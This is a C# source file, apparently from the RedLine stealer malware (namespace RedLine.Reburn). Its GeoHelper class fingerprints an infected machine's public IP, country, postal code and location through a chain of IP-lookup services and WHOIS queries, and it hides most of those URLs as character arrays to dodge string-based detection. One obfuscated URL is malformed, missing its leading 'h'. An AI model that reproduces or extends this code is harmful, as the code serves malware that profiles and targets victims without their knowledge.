using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Models.Serialization;

namespace RedLine.Reburn.Data.Helpers;

public static class GeoHelper
{
	public static GeoInfo Get()
	{
		GeoInfo geoInfo = new GeoInfo();
		try
		{
			try
			{
				IpSb ipSb = new WebClient().DownloadString(new string(new char[23]
				{
					'h', 't', 't', 'p', 's', ':', '/', '/', 'a', 'p',
					'i', '.', 'i', 'p', '.', 's', 'b', '/', 'g', 'e',
					'o', 'i', 'p'
				})).FromJSON<IpSb>();
				geoInfo.IP = ipSb.ip;
				if (geoInfo.IP.Contains(":"))
				{
					geoInfo.IP = null;
				}
				geoInfo.PostalCode = ipSb.postal_code;
				geoInfo.Country = ipSb.country_code;
			}
			catch
			{
			}
			try
			{
				using WebClient webClient = new WebClient();
				geoInfo.IP = webClient.DownloadString(new string(new char[28]
				{
					't', 't', 'p', ':', '/', '/', 'c', 'h', 'e', 'c',
					'k', 'i', 'p', '.', 'a', 'm', 'a', 'z', 'o', 'n',
					'a', 'w', 's', '.', 'c', 'o', 'm', '/'
				})).Trim();
			}
			catch (Exception)
			{
			}
			if (string.IsNullOrEmpty(geoInfo.IP))
			{
				try
				{
					geoInfo.IP = new WebClient().DownloadString(new string(new char[20]
					{
						'h', 't', 't', 'p', 's', ':', '/', '/', 'i', 'p',
						'i', 'n', 'f', 'o', '.', 'i', 'o', '/', 'i', 'p'
					})).Trim(new char[1] { '\n' }).Trim();
				}
				catch (Exception)
				{
				}
			}
			if (string.IsNullOrEmpty(geoInfo.IP))
			{
				try
				{
					geoInfo.IP = new WebClient().DownloadString("https://api.ipify.org").Replace("\n", "");
				}
				catch (Exception)
				{
				}
			}
			if (string.IsNullOrEmpty(geoInfo.IP))
			{
				try
				{
					geoInfo.IP = new WebClient().DownloadString("https://icanhazip.com").Replace("\n", "");
				}
				catch (Exception)
				{
				}
			}
			if (string.IsNullOrEmpty(geoInfo.IP))
			{
				try
				{
					geoInfo.IP = new WebClient().DownloadString("https://wtfismyip.com/text").Replace("\n", "");
				}
				catch (Exception)
				{
				}
			}
			if (string.IsNullOrEmpty(geoInfo.IP))
			{
				try
				{
					geoInfo.IP = new WebClient().DownloadString("http://bot.whatismyipaddress.com/").Replace("\n", "");
				}
				catch (Exception)
				{
				}
			}
			if (string.IsNullOrEmpty(geoInfo.IP))
			{
				try
				{
					string[] array = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[1] { ':' })[1].Substring(1).Split(new char[1] { '<' });
					geoInfo.IP = array[0];
				}
				catch (Exception)
				{
				}
			}
			if (!string.IsNullOrWhiteSpace(geoInfo.IP))
			{
				string text = GetCountry(geoInfo.IP);
				if (!string.IsNullOrWhiteSpace(text) && text.Contains("#"))
				{
					text = geoInfo.Country.Split(new char[1] { '#' })[0].Trim();
				}
				if (string.IsNullOrWhiteSpace(text))
				{
					return geoInfo;
				}
				geoInfo.Country = text;
			}
			try
			{
				if (string.IsNullOrWhiteSpace(geoInfo.IP) || string.IsNullOrWhiteSpace(geoInfo.Country))
				{
					GeoPlugin geoPlugin = new WebClient().DownloadString(new string(new char[36]
					{
						'h', 't', 't', 'p', ':', '/', '/', 'w', 'w', 'w',
						'.', 'g', 'e', 'o', 'p', 'l', 'u', 'g', 'i', 'n',
						'.', 'n', 'e', 't', '/', 'j', 's', 'o', 'n', '.',
						'g', 'p', '?', 'i', 'p', '='
					}) + geoInfo.IP).FromJSON<GeoPlugin>();
					geoInfo.IP = geoPlugin.geoplugin_request;
					if (string.IsNullOrWhiteSpace(geoInfo.Country))
					{
						geoInfo.Country = GetCountry(geoInfo.IP);
						if (!string.IsNullOrWhiteSpace(geoInfo.Country))
						{
							if (geoInfo.Country.Contains("#"))
							{
								geoInfo.Country = geoInfo.Country.Split(new char[1] { '#' })[0].Trim();
							}
						}
						else
						{
							geoInfo.Country = geoPlugin.geoplugin_countryCode;
						}
					}
					geoInfo.Location = ((geoPlugin.geoplugin_city == "null") ? (geoPlugin.geoplugin_latitude + ", " + geoPlugin.geoplugin_longitude) : geoPlugin.geoplugin_city);
					return geoInfo;
				}
				return geoInfo;
			}
			catch
			{
				return geoInfo;
			}
		}
		catch
		{
			return geoInfo;
		}
	}

	private static string GetWhoisInformation(string whoisServer, string url)
	{
		StringBuilder stringBuilder = new StringBuilder();
		BufferedStream stream = new BufferedStream(new TcpClient(whoisServer, 43).GetStream());
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.WriteLine(url);
		streamWriter.Flush();
		StreamReader streamReader = new StreamReader(stream);
		while (!streamReader.EndOfStream)
		{
			stringBuilder.AppendLine(streamReader.ReadLine());
		}
		return stringBuilder.ToString();
	}

	private static string GetCountry(string ip)
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			string text = string.Empty;
			string whoisServer = "whois.iana.org";
			Regex regex = new Regex("refer:(.*)");
			Regex regex2 = new Regex("country:(.*)");
			while (!text.Contains("country") && !(new TimeSpan(DateTime.Now.Ticks - ticks).TotalSeconds >= 60.0))
			{
				text = GetWhoisInformation(whoisServer, ip).Replace("        ", string.Empty);
				if (regex.IsMatch(text))
				{
					whoisServer = regex.Match(text).Value.Split(new char[1] { ':' })[1].Trim().ToUpper();
					continue;
				}
				return regex2.Match(text).Value.Split(new char[1] { ':' })[1].Trim().ToUpper();
			}
			return null;
		}
		catch
		{
			return null;
		}
	}
}
